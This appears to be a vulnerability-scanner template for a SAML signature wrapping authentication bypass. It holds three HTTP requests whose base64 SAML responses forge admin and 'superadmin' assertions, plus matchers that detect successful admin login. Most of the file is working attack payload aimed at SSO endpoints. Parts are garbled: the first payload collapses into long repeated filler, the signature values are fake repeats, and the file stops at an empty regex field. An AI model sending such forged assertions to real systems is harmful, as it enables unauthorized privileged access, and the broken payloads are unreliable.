id: medium-auth-saml-signature-wrapping-attack

info:
  name: SAML Signature Wrapping Attack - Authentication Bypass
  author: elite-red-team
  severity: critical
  description: |
    Advanced SAML signature wrapping attack template targeting SAML SSO implementations.
    Exploits XML signature verification flaws to bypass authentication by wrapping
    signed assertions with malicious content, leading to privilege escalation and
    unauthorized access to enterprise applications.
  reference:
    - https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf
    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_for_Session_Fixation
    - https://research.aurainfosec.io/bypassing-saml20-SSO/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cwe-id: CWE-290
  tags: saml,sso,signature-wrapping,xml-signature,authentication-bypass,enterprise,red-team

http:
  - raw:
      # Test 1: Basic SAML Signature Wrapping with Cloned Assertion
      - |
        POST /saml/acs HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 2847
        User-Agent: Mozilla/5.0 (compatible; SAMLWrapper/1.0)
        
        SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfOGU4ZGM1ZjY5YTJkNDk5ZTlhZGY1OWY0ZjM4MzY2OGRlNWY3MzE3MyIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMTQtMDctMTdUMDE6MDE6NDhaIiBEZXN0aW5hdGlvbj0iaHR0cDovL3NwLmV4YW1wbGUuY29tL2RlbW8xL2luZGV4LnBocD9hY3MiIEluUmVzcG9uc2VUbz0iT05FTE9HSU5fNGZlMzk5NGMwNDZmNjMzYzY2MzU2NzYxZGFhNzc5ZjMwMzQ0YTg3OCI+PHNhbWw6SXNzdWVyPmh0dHA6Ly9pZHAuZXhhbXBsZS5jb20vbWV0YWRhdGEucGhwPC9zYW1sOklzc3Vlcj48c2FtbHA6U3RhdHVzPjxzYW1scDpTdGF0dXNDb2RlIFZhbHVlPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6c3RhdHVzOlN1Y2Nlc3MiLz48L3NhbWxwOlN0YXR1cz48c2FtbDpBc3NlcnRpb24geG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiBJRD0iX2Q3MWE3ZTk5LWY3OTctNDU5MS1iMDZmLWE3NmI0ZGY3ZjVkZCIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMTQtMDctMTdUMDE6MDE6NDhaIj48c2FtbDpJc3N1ZXI+aHR0cDovL2lkcC5leGFtcGxlLmNvbS9tZXRhZGF0YS5waHA8L3NhbWw6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+PGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNyc2Etc2hhMSIvPjxkczpSZWZlcmVuY2UgVVJJPSIjX2Q3MWE3ZTk5LWY3OTctNDU5MS1iMDZmLWE3NmI0ZGY3ZjVkZCI+PGRzOlRyYW5zZm9ybXM+PGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8+PGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI3NoYTEiLz48ZHM6RGlnZXN0VmFsdWU+eWVOVjNxZUZXUzZOaVhxWGVTQkJzR1pCZUVnPTwvZHM6RGlnZXN0VmFsdWU+PC9kczpSZWZlcmVuY2U+PC9kczpTaWduZWRJbmZvPjxkczpTaWduYXR1cmVWYWx1ZT5GdUVuVjNxZUZXUzZOaVhxWGVTQkJzR1pCZUVnRnVFblYzcWVGV1M2TmlYcVhlU0JCc0daQmVFZ0Z1RW5WM3FlRldTNk5pWHFYZVNCQnNHWkJlRWdGdUVuVjNxZUZXUzZOaVhxWGVTQkJzR1pCZUVnRnVFblYzcWVGV1M2TmlYcVhlU0JCc0daQmVFZz08L2RzOlNpZ25hdHVyZVZhbHVlPjxkczpLZXlJbmZvPjxkczpYNTA5RGF0YT48ZHM6WDUwOUNlcnRpZmljYXRlPk1JSUNYRENDQWNVd0RRWUpLb1pJaHZjTkFRRUZCUUF3UlRFTE1Ba0dBMVVFQmhNQ1FVc3hFekFSQmdOVkJBZ01DbE52YldVdFUzUmhkR1V4SVRBZkJnTlZCQW9NR0VsdWRHVnlibVYwSUZkcFpHZHBkSE1nVUhSNUlFeDBaREFlRncweE5EQTNNVGd3TXpBME1qQmFGdzB4TlRBM01UZ3dNekEwTWpCYU1FVXhDekFKQmdOVkJBWVRBa0ZMTVJNd0VRWURWUVFJREFwVGIyMWxMVk4wWVhSbE1TRXdId1lEVlFRS0RCaEpiblJsY201bGRDQlhaV1JuYVhSeklGQjBlU0JNZEdRd2daOHdEUVlKS29aSWh2Y05BUUVCQlFBRGdZMEFNSUdKQW9HQkFOQzJLdGNqSUVCUU9IVXJCZnBJbUFjR2dOUWpzVVRXYzVRcUZiS2xZNVdPSVdZUUdCTWVFVVFQaUFiNXFYbDFPVVFCZzZsUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCUUJCU
        
      # Test 2: SAML Signature Wrapping with Extension Element
      - |
        POST /saml/sso HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 1456
        
        SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfOGU4ZGM1ZjY5YTJkNDk5ZTlhZGY1OWY0ZjM4MzY2OGRlNWY3MzE3MyIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjQtMDEtMTVUMTI6MDA6MDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly90YXJnZXQuY29tL3NhbWwvYWNzIj4KICA8c2FtbDpJc3N1ZXIgeG1sbnM6c2FtbD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI+aHR0cHM6Ly9pZHAuZXhhbXBsZS5jb20vPC9zYW1sOklzc3Vlcj4KICA8c2FtbHA6U3RhdHVzPgogICAgPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPgogIDwvc2FtbHA6U3RhdHVzPgogIDxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iX2Q3MWE3ZTk5LWY3OTctNDU5MS1iMDZmLWE3NmI0ZGY3ZjVkZCIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjQtMDEtMTVUMTI6MDA6MDBaIj4KICAgIDxzYW1sOklzc3Vlcj5odHRwczovL2lkcC5leGFtcGxlLmNvbS88L3NhbWw6SXNzdWVyPgogICAgPHNhbWw6U3ViamVjdD4KICAgICAgPHNhbWw6TmFtZUlEIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6cGVyc2lzdGVudCI+YWRtaW5AdGFyZ2V0LmNvbTwvc2FtbDpOYW1lSUQ+CiAgICAgIDxzYW1sOlN1YmplY3RDb25maXJtYXRpb24gTWV0aG9kPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y206YmVhcmVyIj4KICAgICAgICA8c2FtbDpTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMjQtMDEtMTVUMTM6MDA6MDBaIiBSZWNpcGllbnQ9Imh0dHBzOi8vdGFyZ2V0LmNvbS9zYW1sL2FjcyIvPgogICAgICA8L3NhbWw6U3ViamVjdENvbmZpcm1hdGlvbj4KICAgIDwvc2FtbDpTdWJqZWN0PgogICAgPHNhbWw6QXV0aG5TdGF0ZW1lbnQgQXV0aG5JbnN0YW50PSIyMDI0LTAxLTE1VDEyOjAwOjAwWiI+CiAgICAgIDxzYW1sOkF1dGhuQ29udGV4dD4KICAgICAgICA8c2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZDwvc2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj4KICAgICAgPC9zYW1sOkF1dGhuQ29udGV4dD4KICAgIDwvc2FtbDpBdXRoblN0YXRlbWVudD4KICA8L3NhbWw6QXNzZXJ0aW9uPgo8L3NhbWxwOlJlc3BvbnNlPg==&RelayState=https://target.com/admin
        
      # Test 3: SAML Response with Malicious Wrapped Assertion
      - |
        POST /saml/consume HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 2134
        
        SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfOGU4ZGM1ZjY5YTJkNDk5ZTlhZGY1OWY0ZjM4MzY2OGRlNWY3MzE3MyIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjQtMDEtMTVUMTI6MDA6MDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly90YXJnZXQuY29tL3NhbWwvYWNzIj4KICA8c2FtbDpJc3N1ZXIgeG1sbnM6c2FtbD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI+aHR0cHM6Ly9pZHAuZXhhbXBsZS5jb20vPC9zYW1sOklzc3Vlcj4KICA8c2FtbHA6U3RhdHVzPgogICAgPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPgogIDwvc2FtbHA6U3RhdHVzPgogIDxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iX2Q3MWE3ZTk5LWY3OTctNDU5MS1iMDZmLWE3NmI0ZGY3ZjVkZCIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjQtMDEtMTVUMTI6MDA6MDBaIj4KICAgIDxzYW1sOklzc3Vlcj5odHRwczovL2lkcC5leGFtcGxlLmNvbS88L3NhbWw6SXNzdWVyPgogICAgPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+CiAgICAgIDxkczpTaWduZWRJbmZvPgogICAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgICAgPGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNyc2Etc2hhMSIvPgogICAgICAgIDxkczpSZWZlcmVuY2UgVVJJPSIjX2Q3MWE3ZTk5LWY3OTctNDU5MS1iMDZmLWE3NmI0ZGY3ZjVkZCI+CiAgICAgICAgICA8ZHM6VHJhbnNmb3Jtcz4KICAgICAgICAgICAgPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8+CiAgICAgICAgICAgIDxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz4KICAgICAgICAgIDwvZHM6VHJhbnNmb3Jtcz4KICAgICAgICAgIDxkczpEaWdlc3RNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjc2hhMSIvPgogICAgICAgICAgPGRzOkRpZ2VzdFZhbHVlPnllTlYzcWVGV1M2TmlYcVhlU0JCc0daQmVFZz08L2RzOkRpZ2VzdFZhbHVlPgogICAgICAgIDwvZHM6UmVmZXJlbmNlPgogICAgICA8L2RzOlNpZ25lZEluZm8+CiAgICAgIDxkczpTaWduYXR1cmVWYWx1ZT5GdUVuVjNxZUZXUzZOaVhxWGVTQkJzR1pCZUVnRnVFblYzcWVGV1M2TmlYcVhlU0JCc0daQmVFZ0Z1RW5WM3FlRldTNk5pWHFYZVNCQnNHWkJlRWdGdUVuVjNxZUZXUzZOaVhxWGVTQkJzR1pCZUVnRnVFblYzcWVGV1M2TmlYcVhlU0JCc0daQmVFZz08L2RzOlNpZ25hdHVyZVZhbHVlPgogICAgPC9kczpTaWduYXR1cmU+CiAgICA8c2FtbDpTdWJqZWN0PgogICAgICA8c2FtbDpOYW1lSUQgRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6bmFtZWlkLWZvcm1hdDpwZXJzaXN0ZW50Ij5hZG1pbkB0YXJnZXQuY29tPC9zYW1sOk5hbWVJRD4KICAgICAgPHNhbWw6U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPgogICAgICAgIDxzYW1sOlN1YmplY3RDb25maXJtYXRpb25EYXRhIE5vdE9uT3JBZnRlcj0iMjAyNC0wMS0xNVQxMzowMDowMFoiIFJlY2lwaWVudD0iaHR0cHM6Ly90YXJnZXQuY29tL3NhbWwvYWNzIi8+CiAgICAgIDwvc2FtbDpTdWJqZWN0Q29uZmlybWF0aW9uPgogICAgPC9zYW1sOlN1YmplY3Q+CiAgICA8c2FtbDpBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjQtMDEtMTVUMTI6MDA6MDBaIj4KICAgICAgPHNhbWw6QXV0aG5Db250ZXh0PgogICAgICAgIDxzYW1sOkF1dGhuQ29udGV4dENsYXNzUmVmPnVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphYzpjbGFzc2VzOlBhc3N3b3JkPC9zYW1sOkF1dGhuQ29udGV4dENsYXNzUmVmPgogICAgICA8L3NhbWw6QXV0aG5Db250ZXh0PgogICAgPC9zYW1sOkF1dGhuU3RhdGVtZW50PgogIDwvc2FtbDpBc3NlcnRpb24+CiAgPHNhbWw6QXNzZXJ0aW9uIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfbWFsaWNpb3VzX2Fzc2VydGlvbiIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjQtMDEtMTVUMTI6MDA6MDBaIj4KICAgIDxzYW1sOklzc3Vlcj5odHRwczovL2lkcC5leGFtcGxlLmNvbS88L3NhbWw6SXNzdWVyPgogICAgPHNhbWw6U3ViamVjdD4KICAgICAgPHNhbWw6TmFtZUlEIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6cGVyc2lzdGVudCI+c3VwZXJhZG1pbkB0YXJnZXQuY29tPC9zYW1sOk5hbWVJRD4KICAgICAgPHNhbWw6U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPgogICAgICAgIDxzYW1sOlN1YmplY3RDb25maXJtYXRpb25EYXRhIE5vdE9uT3JBZnRlcj0iMjAyNC0wMS0xNVQxMzowMDowMFoiIFJlY2lwaWVudD0iaHR0cHM6Ly90YXJnZXQuY29tL3NhbWwvYWNzIi8+CiAgICAgIDwvc2FtbDpTdWJqZWN0Q29uZmlybWF0aW9uPgogICAgPC9zYW1sOlN1YmplY3Q+CiAgICA8c2FtbDpBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjQtMDEtMTVUMTI6MDA6MDBaIj4KICAgICAgPHNhbWw6QXV0aG5Db250ZXh0PgogICAgICAgIDxzYW1sOkF1dGhuQ29udGV4dENsYXNzUmVmPnVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphYzpjbGFzc2VzOlBhc3N3b3JkPC9zYW1sOkF1dGhuQ29udGV4dENsYXNzUmVmPgogICAgICA8L3NhbWw6QXV0aG5Db250ZXh0PgogICAgPC9zYW1sOkF1dGhuU3RhdGVtZW50PgogICAgPHNhbWw6QXR0cmlidXRlU3RhdGVtZW50PgogICAgICA8c2FtbDpBdHRyaWJ1dGUgTmFtZT0icm9sZSI+CiAgICAgICAgPHNhbWw6QXR0cmlidXRlVmFsdWU+c3VwZXJhZG1pbjwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT4KICAgICAgPC9zYW1sOkF0dHJpYnV0ZT4KICAgIDwvc2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQ+CiAgPC9zYW1sOkFzc2VydGlvbj4KPC9zYW1scDpSZXNwb25zZT4=&RelayState=https://target.com/admin/panel

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 302
          - 307
          - 308
          
      - type: word
        part: body
        words:
          - "admin"
          - "administrator"
          - "superadmin"
          - "dashboard"
          - "welcome"
          - "logged in"
          - "authentication successful"
          - "access granted"
          - "session established"
          - "user profile"
          - "role"
          - "privilege"
        condition: or
        
      - type: word
        part: header
        words:
          - "Set-Cookie"
          - "Location: /admin"
          - "Location: /dashboard"
          - "Location: /profile"
          - "SAML_SESSION"
          - "JSESSIONID"
          - "auth_token"
        condition: or
        
      - type: regex
        part: response
        regex:
